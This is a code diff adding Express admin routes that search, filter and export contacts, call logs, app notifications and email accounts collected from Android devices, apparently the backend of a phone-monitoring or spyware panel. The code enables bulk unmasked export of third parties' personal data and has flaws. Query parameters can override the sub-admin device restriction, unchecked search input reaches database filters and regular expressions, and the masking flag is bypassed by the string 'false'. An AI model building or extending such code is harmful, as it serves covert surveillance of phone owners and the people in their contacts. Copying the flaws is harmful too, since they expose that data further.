@@ -597,4 +597,428 @@ router.get('/users/:userCode/devices', adminAuth, async (req, res) => {
     }
 });
 
+// Comprehensive data viewer with advanced filters
+router.get('/data-viewer', adminAuth, async (req, res) => {
+    try {
+        const {
+            // Device filters
+            deviceId,
+            userCode,
+            androidId,
+            
+            // Data type filters
+            dataType, // contacts, call_logs, notifications, email_accounts
+            
+            // Date filters
+            startDate,
+            endDate,
+            dateRange, // today, yesterday, last7days, last30days, last90days
+            
+            // Search filters
+            search,
+            searchField, // name, phone, email, etc.
+            
+            // Pagination
+            page = 1,
+            limit = 50,
+            
+            // Sorting
+            sortBy = 'syncTimestamp',
+            sortOrder = 'desc', // asc, desc
+            
+            // Additional filters
+            hasDevice = 'all', // all, with_device, without_device
+            syncStatus, // synced, pending, failed
+            
+            // Export options
+            exportFormat, // csv, json
+            includeSensitiveData = false
+        } = req.query;
+
+        // Build filter object
+        let filter = { isActive: true };
+        
+        // Sub-admin restrictions
+        if (req.admin.role === 'sub_admin') {
+            filter.userCode = req.admin.deviceCode;
+            
+            // Get devices for this sub-admin's device code
+            const devices = await Device.find({ 
+                user_internal_code: req.admin.deviceCode,
+                isActive: true 
+            }).limit(req.admin.maxDevices);
+            
+            if (devices.length > 0) {
+                const deviceIds = devices.map(d => d.deviceId);
+                filter.deviceId = { $in: deviceIds };
+            } else {
+                return res.json({
+                    data: [],
+                    pagination: {
+                        total: 0,
+                        page: parseInt(page),
+                        limit: parseInt(limit),
+                        pages: 0
+                    },
+                    filters: req.query,
+                    summary: {
+                        totalRecords: 0,
+                        dataTypes: {},
+                        devices: [],
+                        dateRange: {}
+                    }
+                });
+            }
+        }
+
+        // Device filters
+        if (deviceId) {
+            if (Array.isArray(deviceId)) {
+                filter.deviceId = { $in: deviceId };
+            } else {
+                filter.deviceId = deviceId;
+            }
+        }
+        
+        if (userCode) {
+            filter.userCode = userCode.toUpperCase();
+        }
+        
+        if (androidId) {
+            filter.androidId = androidId;
+        }
+
+        // Data type filter
+        if (dataType) {
+            const validDataTypes = ['contacts', 'call_logs', 'notifications', 'email_accounts'];
+            if (validDataTypes.includes(dataType)) {
+                filter.dataType = dataType;
+            }
+        }
+
+        // Date filters
+        let dateFilter = {};
+        if (startDate || endDate || dateRange) {
+            if (dateRange) {
+                const now = new Date();
+                switch (dateRange) {
+                    case 'today':
+                        dateFilter = {
+                            $gte: new Date(now.getFullYear(), now.getMonth(), now.getDate()),
+                            $lt: new Date(now.getFullYear(), now.getMonth(), now.getDate() + 1)
+                        };
+                        break;
+                    case 'yesterday':
+                        dateFilter = {
+                            $gte: new Date(now.getFullYear(), now.getMonth(), now.getDate() - 1),
+                            $lt: new Date(now.getFullYear(), now.getMonth(), now.getDate())
+                        };
+                        break;
+                    case 'last7days':
+                        dateFilter = {
+                            $gte: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000)
+                        };
+                        break;
+                    case 'last30days':
+                        dateFilter = {
+                            $gte: new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000)
+                        };
+                        break;
+                    case 'last90days':
+                        dateFilter = {
+                            $gte: new Date(now.getTime() - 90 * 24 * 60 * 60 * 1000)
+                        };
+                        break;
+                }
+            } else {
+                if (startDate) dateFilter.$gte = new Date(startDate);
+                if (endDate) dateFilter.$lt = new Date(new Date(endDate).getTime() + 24 * 60 * 60 * 1000);
+            }
+            
+            if (Object.keys(dateFilter).length > 0) {
+                filter.syncTimestamp = dateFilter;
+            }
+        }
+
+        // Search filters
+        if (search) {
+            const searchRegex = new RegExp(search, 'i');
+            if (searchField) {
+                // Search in specific field
+                filter[searchField] = searchRegex;
+            } else {
+                // Search across multiple fields
+                filter.$or = [
+                    { name: searchRegex },
+                    { phone: searchRegex },
+                    { email: searchRegex },
+                    { address: searchRegex },
+                    { message: searchRegex },
+                    { title: searchRegex },
+                    { description: searchRegex }
+                ];
+            }
+        }
+
+        // Device association filter
+        if (hasDevice === 'with_device') {
+            filter.deviceId = { $exists: true, $ne: null };
+        } else if (hasDevice === 'without_device') {
+            filter.$or = [
+                { deviceId: { $exists: false } },
+                { deviceId: null },
+                { deviceId: '' }
+            ];
+        }
+
+        // Sync status filter
+        if (syncStatus) {
+            switch (syncStatus) {
+                case 'synced':
+                    filter.syncStatus = 'completed';
+                    break;
+                case 'pending':
+                    filter.syncStatus = 'pending';
+                    break;
+                case 'failed':
+                    filter.syncStatus = 'failed';
+                    break;
+            }
+        }
+
+        // Build sort object
+        const sortObj = {};
+        sortObj[sortBy] = sortOrder === 'asc' ? 1 : -1;
+
+        // Calculate pagination
+        const skip = (parseInt(page) - 1) * parseInt(limit);
+        
+        // Get total count for pagination
+        const total = await DeviceData.countDocuments(filter);
+        
+        // Get data with pagination
+        const data = await DeviceData.find(filter)
+            .sort(sortObj)
+            .limit(parseInt(limit))
+            .skip(skip);
+
+        // Get summary statistics
+        const summary = await DeviceData.aggregate([
+            { $match: filter },
+            {
+                $group: {
+                    _id: {
+                        dataType: '$dataType',
+                        deviceId: '$deviceId'
+                    },
+                    count: { $sum: 1 },
+                    lastSync: { $max: '$syncTimestamp' }
+                }
+            },
+            {
+                $group: {
+                    _id: '$_id.dataType',
+                    totalCount: { $sum: '$count' },
+                    deviceCount: { $sum: 1 },
+                    lastSync: { $max: '$lastSync' }
+                }
+            }
+        ]);
+
+        // Get unique devices in results
+        const uniqueDevices = await DeviceData.distinct('deviceId', filter);
+        const devicesInfo = await Device.find({ deviceId: { $in: uniqueDevices } });
+
+        // Get date range info
+        const dateRangeInfo = await DeviceData.aggregate([
+            { $match: filter },
+            {
+                $group: {
+                    _id: null,
+                    earliestDate: { $min: '$syncTimestamp' },
+                    latestDate: { $max: '$syncTimestamp' },
+                    totalRecords: { $sum: 1 }
+                }
+            }
+        ]);
+
+        // Prepare response
+        const response = {
+            data: data.map(item => {
+                const itemData = item.toObject();
+                
+                // Mask sensitive data if not requested
+                if (!includeSensitiveData) {
+                    if (itemData.phone) {
+                        itemData.phone = itemData.phone.replace(/(\d{3})\d{4}(\d{4})/, '$1****$2');
+                    }
+                    if (itemData.email) {
+                        const [local, domain] = itemData.email.split('@');
+                        itemData.email = `${local.substring(0, 2)}***@${domain}`;
+                    }
+                    if (itemData.message) {
+                        itemData.message = itemData.message.substring(0, 50) + '...';
+                    }
+                }
+                
+                return itemData;
+            }),
+            pagination: {
+                total,
+                page: parseInt(page),
+                limit: parseInt(limit),
+                pages: Math.ceil(total / parseInt(limit))
+            },
+            filters: req.query,
+            summary: {
+                totalRecords: total,
+                dataTypes: summary.reduce((acc, item) => {
+                    acc[item._id] = {
+                        count: item.totalCount,
+                        deviceCount: item.deviceCount,
+                        lastSync: item.lastSync
+                    };
+                    return acc;
+                }, {}),
+                devices: devicesInfo.map(device => ({
+                    deviceId: device.deviceId,
+                    deviceName: device.deviceName,
+                    user_internal_code: device.user_internal_code
+                })),
+                dateRange: dateRangeInfo[0] || {
+                    earliestDate: null,
+                    latestDate: null,
+                    totalRecords: 0
+                }
+            }
+        };
+
+        // Handle export
+        if (exportFormat === 'csv') {
+            res.setHeader('Content-Type', 'text/csv');
+            res.setHeader('Content-Disposition', 'attachment; filename="device_data.csv"');
+            
+            // Convert to CSV
+            const csvData = convertToCSV(response.data);
+            return res.send(csvData);
+        }
+
+        res.json(response);
+    } catch (error) {
+        console.error('Data viewer error:', error);
+        res.status(500).json({ message: 'Server error.' });
+    }
+});
+
+// Helper function to convert data to CSV
+function convertToCSV(data) {
+    if (!data || data.length === 0) return '';
+    
+    const headers = Object.keys(data[0]);
+    const csvRows = [headers.join(',')];
+    
+    for (const row of data) {
+        const values = headers.map(header => {
+            const value = row[header];
+            if (typeof value === 'object') {
+                return JSON.stringify(value).replace(/"/g, '""');
+            }
+            return `"${String(value || '').replace(/"/g, '""')}"`;
+        });
+        csvRows.push(values.join(','));
+    }
+    
+    return csvRows.join('\n');
+}
+
+// Get available filter options for data viewer
+router.get('/data-viewer/filters', adminAuth, async (req, res) => {
+    try {
+        let deviceFilter = { isActive: true };
+        
+        // Sub-admin restrictions
+        if (req.admin.role === 'sub_admin') {
+            deviceFilter.user_internal_code = req.admin.deviceCode;
+        }
+
+        // Get all available devices
+        const devices = await Device.find(deviceFilter)
+            .select('deviceId androidId deviceName deviceModel user_internal_code')
+            .sort({ createdAt: -1 });
+
+        // Get all available user codes
+        const userCodes = await DeviceData.distinct('userCode', { isActive: true });
+        
+        // Get all available data types
+        const dataTypes = await DeviceData.distinct('dataType', { isActive: true });
+
+        // Get date range info
+        const dateRangeInfo = await DeviceData.aggregate([
+            { $match: { isActive: true } },
+            {
+                $group: {
+                    _id: null,
+                    earliestDate: { $min: '$syncTimestamp' },
+                    latestDate: { $max: '$syncTimestamp' },
+                    totalRecords: { $sum: 1 }
+                }
+            }
+        ]);
+
+        // Get sync status options
+        const syncStatuses = await DeviceData.distinct('syncStatus', { isActive: true });
+
+        // Get searchable fields based on data types
+        const searchableFields = {
+            contacts: ['name', 'phone', 'email', 'address'],
+            call_logs: ['phone', 'name', 'duration', 'type'],
+            notifications: ['title', 'message', 'packageName', 'appName'],
+            email_accounts: ['email', 'name', 'provider']
+        };
+
+        res.json({
+            devices: devices.map(device => ({
+                deviceId: device.deviceId,
+                androidId: device.androidId,
+                deviceName: device.deviceName || 'Unknown Device',
+                deviceModel: device.deviceModel,
+                user_internal_code: device.user_internal_code
+            })),
+            userCodes: userCodes.sort(),
+            dataTypes: dataTypes.sort(),
+            dateRange: dateRangeInfo[0] || {
+                earliestDate: null,
+                latestDate: null,
+                totalRecords: 0
+            },
+            syncStatuses: syncStatuses.filter(status => status).sort(),
+            searchableFields,
+            sortOptions: [
+                { value: 'syncTimestamp', label: 'Sync Time' },
+                { value: 'createdAt', label: 'Created Date' },
+                { value: 'name', label: 'Name' },
+                { value: 'phone', label: 'Phone' },
+                { value: 'email', label: 'Email' },
+                { value: 'title', label: 'Title' },
+                { value: 'dataType', label: 'Data Type' }
+            ],
+            dateRangeOptions: [
+                { value: 'today', label: 'Today' },
+                { value: 'yesterday', label: 'Yesterday' },
+                { value: 'last7days', label: 'Last 7 Days' },
+                { value: 'last30days', label: 'Last 30 Days' },
+                { value: 'last90days', label: 'Last 90 Days' }
+            ],
+            deviceAssociationOptions: [
+                { value: 'all', label: 'All Records' },
+                { value: 'with_device', label: 'With Device' },
+                { value: 'without_device', label: 'Without Device' }
+            ]
+        });
+    } catch (error) {
+        console.error('Get filter options error:', error);
+        res.status(500).json({ message: 'Server error.' });
+    }
+});
+
 module.exports = router; 
